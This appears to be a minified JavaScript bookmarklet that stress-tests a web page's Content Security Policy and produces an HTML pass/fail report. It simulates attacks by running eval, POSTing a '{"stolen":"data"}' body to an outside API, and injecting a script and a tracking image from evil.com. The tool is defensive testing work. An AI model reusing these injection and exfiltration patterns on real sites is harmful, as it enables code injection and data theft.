javascript:(function(){console.clear();console.log("%cüõ°Ô∏è CSP Stress Test v5","color: #e74c3c; font-weight: bold; font-size: 1.2em;");const t={violations:[],results:{eval:{status:"PENDING",msg:"",payload:"",loc:""},connect:{status:"PENDING",msg:"",payload:"",loc:""},script:{status:"PENDING",msg:"",payload:"",loc:""},img:{status:"PENDING",msg:"",payload:"",loc:""}}};document.addEventListener("securitypolicyviolation",e=>{t.violations.push({directive:e.violatedDirective,blocked:e.blockedURI})});const e=[];e.push(new Promise(e=>{const s="eval('window.csp_check = true')",n="JS Runtime (eval)";try{eval("window.csp_check = true"),window.csp_check?(t.results.eval={status:"FAILED",msg:"Unsafe Eval allowed",payload:s,loc:n},delete window.csp_check):t.results.eval={status:"PASSED",msg:"Eval blocked",payload:s,loc:n},e()}catch(o){t.results.eval={status:"PASSED",msg:"Eval threw error (Blocked)",payload:s,loc:n},e()}}));e.push(new Promise(e=>{const s="https://jsonplaceholder.typicode.com/posts",n='{"stolen":"data"}',o=`FETCH: ${s}\nBODY: ${n}`,a="Network API (fetch)";fetch(s,{method:"POST",body:n}).then(s=>{s.ok?(t.results.connect={status:"FAILED",msg:"Data sent via Fetch",payload:o,loc:a},e()):(t.results.connect={status:"WARNING",msg:"Fetch failed (Check Network Tab)",payload:o,loc:a},e())}).catch(s=>{setTimeout(()=>{t.violations.some(e=>e.directive.includes("connect"))?t.results.connect={status:"PASSED",msg:"Blocked by CSP (connect-src)",payload:o,loc:a}:t.results.connect={status:"WARNING",msg:"Failed (CORS/Network Error)",payload:o,loc:a},e()},200)})}));e.push(new Promise(e=>{const s="https://evil.com/malware.js",n=`<script src="${s}"></script>`,o=document.createElement("script"),a="DOM (document.body)";o.src=s,o.onload=()=>{t.results.script={status:"FAILED",msg:"External Script Loaded",payload:n,loc:a},o.remove(),e()},o.onerror=()=>{setTimeout(()=>{t.violations.some(e=>e.directive.includes("script"))?t.results.script={status:"PASSED",msg:"Blocked by CSP (script-src)",payload:n,loc:a}:t.results.script={status:"PASSED",msg:"Failed to load (Network Error)",payload:n,loc:a},o.remove(),e()},200)},document.body.appendChild(o)}));e.push(new Promise(e=>{const s="https://evil.com/tracker.png",n=`<img src="${s}">`,o=new Image,a="DOM (Image Object)";o.src=s,o.onload=()=>{t.results.img={status:"FAILED",msg:"Tracking Pixel Loaded",payload:n,loc:a},e()},o.onerror=()=>{setTimeout(()=>{t.violations.some(e=>e.directive.includes("img"))?t.results.img={status:"PASSED",msg:"Blocked by CSP (img-src)",payload:n,loc:a}:t.results.img={status:"PASSED",msg:"Failed to load (Network Error)",payload:n,loc:a},e()},200)}}));Promise.all(e).then(()=>{setTimeout(()=>{const e=JSON.stringify(t,null,2),s=`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>CSP Report - ${window.location.hostname}</title><style>body{background:#111;color:#ddd;font-family:'Segoe UI',monospace;padding:20px}h2{border-bottom:2px solid #e74c3c;padding-bottom:5px;color:#e74c3c;margin-top:30px}.box{background:#222;padding:15px;border-radius:5px;margin-bottom:20px;border:1px solid #444}textarea{width:100%;height:150px;background:#000;color:#2ecc71;border:1px solid #444;padding:10px;font-family:monospace;font-size:11px}table{width:100%;border-collapse:collapse;margin-top:10px;background:#222}th,td{padding:10px;border:1px solid #444;text-align:left;font-size:0.9em}th{background:#333;color:#fff}.badge{padding:4px 8px;border-radius:4px;font-weight:bold;font-size:0.8em}.pass{background:#27ae60;color:#fff}.fail{background:#c0392b;color:#fff}.warn{background:#f39c12;color:#fff}code{background:#333;padding:2px 4px;border-radius:3px;font-family:monospace;color:#f1c40f;font-size:0.85em}.loc{color:#3498db;font-style:italic}</style></head><body><h1>üõ°Ô∏è CSP Stress Test</h1><div class="box"><h3>üìÑ Raw JSON Report</h3><textarea id="jsonArea">${e}</textarea></div><h2>üß™ Attack Simulation Results</h2><table><thead><tr><th>Test Type</th><th>Status</th><th>Details</th><th>Payload Used</th><th>Injection Point</th></tr></thead><tbody>${Object.keys(t.results).map(e=>{const s=t.results[e],n="PASSED"===s.status?"pass":"FAILED"===s.status?"fail":"warn";return`<tr><td>${e.toUpperCase()}</td><td><span class="badge ${n}">${s.status}</span></td><td>${s.msg}</td><td><code>${s.payload.replace(/</g,"&lt;")}</code></td><td class="loc">${s.loc}</td></tr>`}).join("")}</tbody></table><h2>üö® CSP Violations Triggered (${t.violations.length})</h2><table><thead><tr><th>Directive</th><th>Blocked URI</th></tr></thead><tbody>${t.violations.map(e=>`<tr><td style="color:#e74c3c">${e.directive}</td><td>${e.blocked}</td></tr>`).join("")}</tbody></table><script>document.getElementById("jsonArea").select();<\/script></body></html>`,n=new Blob([s],{type:"text/html;charset=utf-8"}),o=URL.createObjectURL(n),a=window.open(o,"_blank");a||alert("‚ö†Ô∏è Popup Blocked! Allow popups to see the CSP report.")},500)})})();